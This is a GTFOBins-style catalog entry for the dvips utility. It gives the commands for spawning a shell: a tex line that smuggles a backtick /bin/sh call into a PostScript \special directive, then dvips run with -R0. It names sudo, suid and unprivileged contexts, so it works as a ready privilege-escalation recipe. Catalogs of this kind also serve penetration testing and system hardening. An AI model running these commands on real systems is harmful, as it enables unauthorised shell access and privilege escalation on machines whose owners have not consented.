---
type: gtfobin
name: dvips
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# dvips

## shell

```bash
dvips -R0 texput.dvi
```
_The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.

```
tex '\special{psfile="`/bin/sh 1>&0"}\end'
```_
**Contexts:** sudo, suid, unprivileged
